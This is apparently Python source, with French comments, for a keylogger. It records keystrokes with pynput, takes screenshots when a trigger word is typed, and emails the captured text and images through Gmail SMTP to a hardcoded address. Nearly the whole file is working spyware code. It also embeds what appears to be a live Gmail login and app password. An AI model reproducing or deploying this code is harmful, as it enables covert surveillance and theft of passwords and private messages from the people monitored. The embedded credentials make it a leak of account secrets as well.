from pynput import keyboard #pour les key
import socket #pour le nom
import time #pour le timer
import smtplib #pour les mails
import pyscreenshot #pour screen
from email.mime.multipart import MIMEMultipart #pour ajouter une photo au mail
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

print("Ready")
nom = socket.gethostname() + " "

resultat = ""
phrases = ""
version = 0

mail = smtplib.SMTP('smtp.gmail.com', 587)
mail.ehlo()
mail.starttls()
mail.login("galpaltvtv@gmail.com", "xjdcqriaqnehrxqu")

def send_email(image):
    global version, resultat
    
    # creation du message
    message = MIMEMultipart()
    message['From'] = "galpaltvtv@gmail.com"
    message['To'] = "galpaltvtv@gmail.com"
    message['Subject'] = nom + " - Version " + str(version)
    
    # ajout du texte et de la photo au mail
    message.attach(MIMEText(resultat))
    image_data = open(image, 'rb').read()
    image = MIMEImage(image_data, name="screenshot.png")
    message.attach(image)

    # envoi du message
    mail.sendmail("galpaltvtv@gmail.com", "galpaltvtv@gmail.com", message.as_string())
    
    # réinitialisation de l'image et du texte
    image_data = None
    resultat = ""

def on_press(key):
    global phrases, resultat,version
    try:
        if key == keyboard.Key.backspace:
            phrases = phrases[:-1]
        elif hasattr(key, 'char'):
            phrases += key.char

            if phrases[-4:] == "show":
                # Incrémentation de la version
                version += 1    
                # Capture de l'image
                image_path = "screenshot.png"
                image = pyscreenshot.grab()
                image.save(image_path)
                
                # Envoi de l'email
                send_email(image_path)
                resultat=""

            if phrases[-3:] == "mop":
                quit()
            
        else:
            phrases += " "
    except AttributeError:
        pass

def on_release(key):
    global phrases, resultat
    if key == keyboard.Key.enter or key == keyboard.KeyCode(char='.') or key == keyboard.KeyCode(char='?') or key == keyboard.KeyCode(char='!'):
        print(phrases)
        resultat = resultat + phrases
        phrases = ""

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
